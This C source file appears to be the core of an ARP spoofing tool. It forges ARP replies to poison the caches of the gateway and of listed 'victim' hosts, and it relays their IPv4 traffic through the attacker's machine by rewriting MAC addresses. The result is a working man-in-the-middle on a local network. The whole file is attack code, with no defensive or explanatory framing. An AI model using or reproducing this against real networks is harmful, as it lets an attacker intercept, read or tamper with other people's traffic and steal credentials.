#include "std.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <time.h>
#include <pthread.h>
#include <netinet/in.h>
#include <linux/if_arp.h>
#include "PcapManager.h"
#include "AttackInfo.h"

pcap_t** gPcapHandle;
BYTE gLocalMac[MAC_LEN];
BYTE gGatewayIp[IP_LEN];
BYTE gGatewayMac[MAC_LEN];
BYTE gLocalIp[IP_LEN];

void MakeArpReplyPacket(BYTE* localMac, BYTE* victimMac, BYTE* arpSenderMac, BYTE* arpSenderIp, BYTE* arpTargetIp, BYTE* packet)
{
    struct ETH *eth = (struct ETH*)packet;
    struct ARP *arp = (struct ARP*)(packet + sizeof(struct ETH));
    memcpy(eth->dstMac, victimMac, MAC_LEN);
    memcpy(eth->srcMac, localMac, MAC_LEN);
    eth->type = htons(ETH_P_ARP);

    arp->hardwareType = htons(ARPHRD_ETHER);
    arp->protocolType = htons(ETH_P_IP);
    arp->hardwareSize = 6;
    arp->protocolSize = 4;
    arp->opcode = htons(ARPOP_REPLY);
    memcpy(arp->senderHardwareAddr, arpSenderMac, MAC_LEN);
    memcpy(arp->senderProtocolAddr, arpSenderIp, IP_LEN);
    memcpy(arp->targetHardwareAddr, victimMac, MAC_LEN);
    memcpy(arp->targetProtocolAddr, arpTargetIp, IP_LEN);
}

void PacketCallback(u_char* args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct ETH* eth = (struct ETH*)packet;

    if (eth->type == htons(ETH_P_IP)) // Type : IPv4
    {
        BYTE victimMac[MAC_LEN];
        struct IP* ip = (struct IP*)(packet + sizeof(struct ETH));

        // sender -> receiver
        if (memcmp(ip->dstIp, gLocalIp, IP_LEN) != 0 &&
            IsIpInTable(ip->srcIp, victimMac))
        {
            u_char* temPacket = malloc(header->len);
            if (temPacket)
            {
                memcpy(temPacket, packet, header->len);
                memcpy(temPacket, gGatewayMac, MAC_LEN);
                memcpy(&temPacket[MAC_LEN], gLocalMac, MAC_LEN);
                // change mac address.
                pcap_sendpacket(*gPcapHandle, temPacket, header->len);
                free(temPacket);
            }
        }
        // receiver -> sender
        else if (memcmp(ip->srcIp, gLocalIp, IP_LEN) != 0 &&
                 IsIpInTable(ip->dstIp, victimMac))
        {
            u_char* temPacket = malloc(header->len);
            if (temPacket)
            {
                memcpy(temPacket, packet, header->len);
                memcpy(temPacket, victimMac, MAC_LEN);
                memcpy(&temPacket[MAC_LEN], gLocalMac, MAC_LEN);
                // change mac address.
                pcap_sendpacket(*gPcapHandle, temPacket, header->len);
                free(temPacket);
            }
        }
    }
    // arp request
    else if (eth->type == htons(ETH_P_ARP) &&
             memcmp(eth->dstMac, "\xff\xff\xff\xff\xff\xff", MAC_LEN) == 0)
    {
        BYTE victimMac[MAC_LEN];
        struct ARP* arp = (struct ARP*)(packet + sizeof(struct ETH));

        // gateway -> target
        if (memcmp(eth->srcMac, gGatewayMac, MAC_LEN) == 0 &&
            IsIpInTable(arp->targetProtocolAddr, victimMac))
        {
            BYTE arpPacket[42];
            int i = 0;
            MakeArpReplyPacket(gLocalMac, gGatewayMac, gLocalMac, arp->targetProtocolAddr, arp->senderProtocolAddr, arpPacket);
            for (; i < 3; i++)
            {
                pcap_sendpacket(*gPcapHandle, arpPacket, sizeof(arpPacket));
                usleep(1000); // sleep 1 ms
            }
        }
        // target -> gateway
        else if (IsMacInTable(eth->srcMac))
        {
            BYTE arpPacket[42];
            int i = 0;
            MakeArpReplyPacket(gLocalMac, eth->srcMac, gLocalMac, arp->targetProtocolAddr, arp->senderProtocolAddr, arpPacket);
            for (; i < 3; i++)
            {
                pcap_sendpacket(*gPcapHandle, arpPacket, sizeof(arpPacket));
                usleep(1000); // sleep 1 ms
            }
        }
    }
}

static void *ThreadFunction(void *arg)
{
    gPcapHandle = arg;

    pcap_loop(*gPcapHandle, 0, (pcap_handler)PacketCallback, NULL);

    return 0;
}

int InitPcap(pcap_t **handle)
{
    bpf_u_int32 mask;
    bpf_u_int32 net;
    char dev[] = "eth0";
    char errbuf[PCAP_ERRBUF_SIZE];
    pthread_t threadId;
    pthread_attr_t attr;
    int status;

    if ((status = pcap_lookupnet(dev, &net, &mask, errbuf)) == 0)
    {
        *handle = pcap_open_live(dev, BUFSIZ, 0, 0, errbuf);
        if (*handle)
        {
            if ((status = pthread_attr_init(&attr)) == 0)
            {
                status = pthread_create(&threadId, &attr, &ThreadFunction, handle);
                pthread_attr_destroy(&attr);
            }
        }
        else
        {
            fprintf(stderr, "open_live error: %s\n", errbuf);
            status = -1;
        }
    }
    else
    {
        fprintf(stderr, "Get netmask fail: %s\n", errbuf);
    }

    return status;
}
